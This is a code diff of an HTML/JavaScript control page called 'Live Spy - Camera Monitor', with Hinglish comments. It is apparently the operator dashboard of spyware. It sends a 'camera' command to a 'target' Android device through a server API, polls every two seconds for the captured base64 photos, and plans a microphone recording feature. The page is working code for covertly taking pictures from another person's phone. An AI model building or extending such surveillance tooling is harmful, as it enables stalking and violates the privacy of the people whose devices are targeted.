@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Spy - Camera/Mic</title>
+    <title>Live Spy - Camera Monitor</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg: #050505;
-            --accent: #ff4444; /* Recording Red */
-            --glass: rgba(255, 255, 255, 0.05);
+            --accent: #ff4444;
+            --glass: rgba(255, 255, 255, 0.1);
+            --border: #333;
         }
         body { 
             background: var(--bg); 
@@ -19,7 +20,7 @@
             padding: 10px;
             display: flex;
             flex-direction: column;
-            height: 100vh; /* Full screen height */
+            height: 100vh;
             box-sizing: border-box;
         }
 
@@ -27,115 +28,243 @@
         .top-nav {
             display: flex;
             align-items: center;
-            padding: 5px 0;
+            justify-content: space-between;
+            padding: 10px 5px;
         }
-        .back-btn { color: white; text-decoration: none; font-size: 1.2rem; }
+        .back-btn { 
+            color: #ccc; 
+            text-decoration: none; 
+            font-size: 1.1rem; 
+            display: flex; 
+            align-items: center; 
+            gap: 5px; 
+        }
+        .device-id-display {
+            font-size: 0.9rem;
+            color: #888;
+            font-family: monospace;
+        }
 
-        /* --- BADA MONITOR AREA --- */
+        /* --- MONITOR AREA --- */
         .monitor { 
-            flex: 1; /* Jitni jagah hai sab monitor le lega */
+            flex: 1;
             width: 100%; 
             background: #000; 
             margin: 10px 0; 
-            border: 1px solid #333; 
-            border-radius: 15px; 
+            border: 1px solid var(--border); 
+            border-radius: 12px; 
             display: flex; 
             align-items: center; 
             justify-content: center; 
             position: relative; 
-            overflow: hidden; 
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
         
-        .status { 
+        .status-badge { 
             position: absolute; 
             top: 15px; 
             left: 15px; 
-            background: rgba(255,0,0,0.8); 
-            padding: 4px 10px; 
-            border-radius: 5px; 
+            background: rgba(255, 0, 0, 0.2); 
+            color: var(--accent);
+            border: 1px solid var(--accent);
+            padding: 4px 8px; 
+            border-radius: 4px; 
             font-size: 10px; 
             font-weight: bold;
             letter-spacing: 1px;
-            animation: blink 1s infinite; 
             z-index: 5;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
-        @keyframes blink { 50% { opacity: 0.2; } }
+        
+        .blinking-dot {
+            width: 6px;
+            height: 6px;
+            background-color: var(--accent);
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
 
-        #liveStream {
-            max-width: 100%;
-            max-height: 100%;
+        @keyframes blink { 50% { opacity: 0; } }
+
+        .timestamp {
+            position: absolute;
+            bottom: 10px;
+            right: 15px;
+            color: rgba(255,255,255,0.5);
+            font-size: 10px;
+            font-family: monospace;
+            background: rgba(0,0,0,0.7);
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+
+        #placeholderIcon {
+            color: #222;
+            font-size: 3rem;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+
+        #liveImage {
+            width: 100%;
+            height: 100%;
             object-fit: contain;
+            display: none;
         }
 
-        /* --- CHOTE BUTTONS AREA --- */
+        /* --- CONTROLS AREA --- */
         .controls-grid { 
             display: grid; 
-            grid-template-columns: repeat(4, 1fr); /* Ek hi line mein 4 buttons */
-            gap: 8px; 
+            grid-template-columns: repeat(3, 1fr); 
+            gap: 10px; 
             padding-bottom: 10px;
         }
 
         .btn { 
-            padding: 10px 5px; 
-            border-radius: 10px; 
-            border: 1px solid #222; 
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid var(--border); 
             background: var(--glass); 
             color: #ddd; 
             cursor: pointer; 
-            font-size: 11px; /* Chota font */
+            font-size: 11px; 
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 5px;
-            transition: 0.2s;
+            gap: 8px;
+            transition: all 0.2s ease;
         }
-        .btn i { font-size: 1.2rem; } /* Icon size balanced */
-        .btn:active { background: #333; transform: scale(0.95); }
+        .btn i { font-size: 1.4rem; }
         
-        .btn-stop { border-color: var(--accent); color: var(--accent); }
+        .btn:active { transform: scale(0.95); background: #222; }
+        
+        .btn-capture { border-color: #007bff; color: #007bff; }
+        .btn-capture:active { background: rgba(0, 123, 255, 0.1); }
 
     </style>
 </head>
 <body>
 
     <div class="top-nav">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Live Cam</a>
+        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Dashboard</a>
+        <span class="device-id-display" id="dispID">ID: ...</span>
     </div>
     
     <div class="monitor">
-        <div class="status">● LIVE FEED</div>
-        <i id="placeholderIcon" class="fa-solid fa-video-slash fa-2x" style="color:#222"></i>
-        <img id="liveStream" src="" style="display:none;">
+        <div class="status-badge">
+            <div class="blinking-dot"></div> MONITORING
+        </div>
+        
+        <i id="placeholderIcon" class="fa-solid fa-satellite-dish"></i>
+        
+        <img id="liveImage" src="" alt="Live Feed">
+        
+        <div class="timestamp" id="imgTime">WAITING FOR DATA...</div>
     </div>
 
     <div class="controls-grid">
-        <button class="btn" onclick="send('cam_front')">
-            <i class="fa-solid fa-camera-rotate"></i> Front
+        <button class="btn btn-capture" onclick="sendCommand('camera')">
+            <i class="fa-solid fa-camera"></i> TAKE PHOTO
         </button>
-        <button class="btn" onclick="send('cam_back')">
-            <i class="fa-solid fa-camera"></i> Back
+
+        <button class="btn" onclick="alert('Currently set to Front Cam only in Android Code')">
+            <i class="fa-solid fa-camera-rotate"></i> SWITCH CAM
         </button>
-        <button class="btn" onclick="send('mic_on')">
-            <i class="fa-solid fa-microphone"></i> Mic
-        </button>
-        <button class="btn btn-stop" onclick="send('stop')">
-            <i class="fa-solid fa-circle-stop"></i> Stop
+
+        <button class="btn" onclick="alert('Audio recording feature coming soon!')">
+            <i class="fa-solid fa-microphone"></i> RECORD MIC
         </button>
     </div>
 
     <script>
-        function send(cmd) {
-            console.log("Sending command: " + cmd);
-            // Jab real connection banega tab placeholder hide hoga aur image dikhegi
-            if(cmd.includes('cam')){
-                document.getElementById('placeholderIcon').style.display = 'none';
-                document.getElementById('liveStream').style.display = 'block';
-                document.getElementById('liveStream').src = "https://via.placeholder.com/400x700?text=Connecting+Stream...";
-            } else if(cmd === 'stop'){
-                document.getElementById('placeholderIcon').style.display = 'block';
-                document.getElementById('liveStream').style.display = 'none';
+        // 1. Device ID fetch karo
+        const deviceId = localStorage.getItem('target_device_id');
+        
+        if(deviceId) {
+            document.getElementById('dispID').innerText = "ID: " + deviceId;
+        } else {
+            alert("No Device ID Selected! Redirecting...");
+            window.location.href = "index.html";
+        }
+
+        const API_URL = ""; // Relative path (same server)
+
+        // 2. Command Bhejo (Android app ko signal dene ke liye)
+        async function sendCommand(cmd) {
+            const btn = document.querySelector('.btn-capture');
+            btn.style.opacity = "0.5";
+            btn.innerText = "REQUESTING...";
+
+            try {
+                const response = await fetch(`${API_URL}/api/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: deviceId, command: cmd })
+                });
+                const result = await response.json();
+                console.log("Command Sent:", result);
+            } catch (error) {
+                console.error("Error sending command:", error);
+            }
+
+            setTimeout(() => {
+                btn.style.opacity = "1";
+                btn.innerHTML = '<i class="fa-solid fa-camera"></i> TAKE PHOTO';
+            }, 1000);
+        }
+
+        // 3. Image Fetch Loop (Har 3 second mein check karega)
+        let lastImageTime = 0;
+
+        async function fetchLatestImage() {
+            try {
+                // Server se JSON file maango
+                const response = await fetch(`${API_URL}/api/get-data/${deviceId}/cam`);
+                
+                if (!response.ok) return;
+
+                const data = await response.json();
+                
+                // Agar data valid hai aur nayi image hai
+                if (data.image && data.time > lastImageTime) {
+                    lastImageTime = data.time;
+                    
+                    const imgElement = document.getElementById('liveImage');
+                    const placeholder = document.getElementById('placeholderIcon');
+                    const timeLabel = document.getElementById('imgTime');
+
+                    // Image Source Update (Base64)
+                    imgElement.src = data.image; // "data:image/jpeg;base64,..." android se aata hai ya add karna padega
+                    
+                    // Android code shayad "data:image..." prefix bhej raha hai, 
+                    // agar nahi bhej raha to yahan check kar sakte hain:
+                    if(!data.image.startsWith('data:image')) {
+                        imgElement.src = "data:image/jpeg;base64," + data.image;
+                    }
+
+                    // UI Update
+                    imgElement.style.display = "block";
+                    placeholder.style.display = "none";
+                    
+                    // Time format
+                    const date = new Date(parseInt(data.time));
+                    timeLabel.innerText = date.toLocaleTimeString();
+                }
+
+            } catch (error) {
+                console.log("Waiting for data...");
             }
         }
+
+        // Loop start karo (Every 2 seconds)
+        setInterval(fetchLatestImage, 2000);
+        
+        // Page load hote hi ek baar check karo
+        fetchLatestImage();
+
     </script>
 </body>
 </html>
